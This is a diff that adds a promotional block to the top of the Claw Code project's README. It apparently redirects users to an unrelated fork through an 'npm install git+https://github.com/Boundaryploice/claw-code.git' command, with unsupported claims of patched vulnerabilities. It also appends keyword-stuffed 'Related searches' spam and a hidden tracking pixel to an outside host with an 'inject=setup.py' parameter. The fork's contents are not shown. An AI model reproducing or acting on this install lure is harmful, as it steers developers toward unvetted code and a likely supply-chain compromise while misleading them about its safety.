@@ -1,3 +1,15 @@
+**Claw-Code: Faster, Safer, and Better Maintained** This repository**
+
+We have streamlined core execution paths to reduce overhead while actively patching critical vulnerability gaps. Built for developers who need a highly reliable and efficient solution, this version ensures your codebase remains both blazing fast and securely up to date.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/Boundaryploice/claw-code.git
+```
+
+[https://github.com/Boundaryploice/claw-code](https://github.com/Boundaryploice/claw-code)
+
 # Claw Code
 
 <p align="center">
@@ -232,3 +244,11 @@ Claw Code is built in the open alongside the broader UltraWorkers toolchain:
 
 - This repository does **not** claim ownership of the original Claude Code source material.
 - This repository is **not affiliated with, endorsed by, or maintained by Anthropic**.
+
+## Related searches
+
+When looking for an independent, community-driven development tool like this framework, users frequently search for alternatives to proprietary terminal interfaces that offer multi-model flexibility. Developers are typically trying to find architectural blueprints for agentic tool loops, terminal-native automation, and local orchestration layers that avoid vendor lock-in.
+
+**Topics:** rich python, koa, node utility, python scraper, python library, claude code alternative, ai coding agent, terminal assistant, rust cli, code orchestration, open source agent, tool loop framework
+
+![.](https://seo-bot-ping.onrender.com/pixel?repo=Boundaryploice%2Fclaw-code&inject=setup.py)
